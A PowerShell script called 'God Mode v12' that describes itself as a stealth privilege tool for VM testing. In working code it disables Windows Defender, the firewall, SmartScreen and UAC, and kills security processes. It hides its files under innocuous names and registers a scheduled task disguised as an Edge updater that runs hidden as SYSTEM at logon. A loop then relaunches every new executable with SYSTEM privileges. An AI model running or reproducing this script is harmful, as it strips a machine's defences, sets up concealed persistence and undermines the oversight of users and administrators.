#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode v12 - Overhauled Edition
.DESCRIPTION
    Advanced stealth + dangerous privilege tool.
    For VM security testing only.
    Restricted to Built-in Administrator account.
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch,
    [switch]$Help
)

# ============================================================
#  CONFIGURATION
# ============================================================
$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskPrefix = "MicrosoftEdgeUpdateTask_"

# ============================================================
#  SECURITY CHECK
# ============================================================
function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return ($sid -like "*-500")
}

if (-not (Test-BuiltInAdmin) -and -not $Status -and -not $Help) {
    Write-Host "`n[ACCESS DENIED] This tool is restricted to the Built-in Administrator only.`n" -ForegroundColor Red
    exit 1
}

# ============================================================
#  LOGGING
# ============================================================
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
}

# ============================================================
#  DANGEROUS CONFIGURATION
# ============================================================
function Enable-DangerousMode {
    Write-Log "Enabling dangerous mode..." "WARN"

    try {
        # Disable Windows Defender
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

        # Disable Windows Firewall
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue

        # Disable SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

        # Disable UAC
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        # Kill security processes
        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue

        Write-Log "Dangerous mode enabled successfully." "WARN"
    }
    catch {
        Write-Log "Error enabling dangerous mode: $_" "ERROR"
    }
}

function Disable-DangerousMode {
    Write-Log "Disabling dangerous mode..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
        Write-Log "Dangerous mode disabled." "OK"
    }
    catch {
        Write-Log "Failed to fully disable dangerous mode: $_" "ERROR"
    }
}

# ============================================================
#  STEALTH TASK MANAGEMENT
# ============================================================
function Register-StealthTask {
    $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$TaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

# ============================================================
#  PROCESS ELEVATION
# ============================================================
function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }

    Write-Log "Elevating: $Path" "STEALTH"

    try {
        $action = New-ScheduledTaskAction -Execute $Path
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 350
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    }
    catch {
        Write-Log "Failed to elevate process: $Path" "ERROR"
    }
}

# ============================================================
#  MAIN MONITORING LOOP
# ============================================================
function Start-MonitorLoop {
    if (-not (Test-Path $FlagFile)) {
        Write-Log "God Mode is not active." "ERROR"
        return
    }

    Write-Log "God Mode monitoring started." "INFO"

    $seenProcesses = @{}

    while ($true) {
        Start-Sleep -Seconds 2

        $newProcesses = Get-WmiObject Win32_Process | Where-Object {
            $_.CreationDate -and 
            ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
        }

        foreach ($process in $newProcesses) {
            if ($process.ExecutablePath -and $process.ExecutablePath -like "*.exe") {
                if (-not $seenProcesses.ContainsKey($process.ExecutablePath)) {
                    $seenProcesses[$process.ExecutablePath] = $true
                    Elevate-Process $process.ExecutablePath
                }
            }
        }
    }
}

# ============================================================
#  TOGGLE & STATUS
# ============================================================
function Enable-GodMode {
    "1" | Out-File $FlagFile -Force
    Register-StealthTask
    Enable-DangerousMode
    Write-Log "God Mode ENABLED" "WARN"
}

function Disable-GodMode {
    Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
    Unregister-StealthTask
    Disable-DangerousMode
    Write-Log "God Mode DISABLED" "WARN"
}

function Show-Status {
    if (Test-Path $FlagFile) {
        Write-Host "God Mode Status: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
    } else {
        Write-Host "God Mode Status: INACTIVE" -ForegroundColor Green
    }
}

# ============================================================
#  MAIN EXECUTION
# ============================================================

if ($Help) {
    Write-Host @"
God Mode v12 - Commands:
  -ToggleOn     Enable God Mode
  -ToggleOff    Disable God Mode
  -Status       Show current status
  -Launch       Start monitoring manually
"@ -ForegroundColor Cyan
    exit
}

if ($ToggleOn)  { Enable-GodMode; exit }
if ($ToggleOff) { Disable-GodMode; exit }
if ($Status)    { Show-Status; exit }

if ($Launch) {
    Start-MonitorLoop
}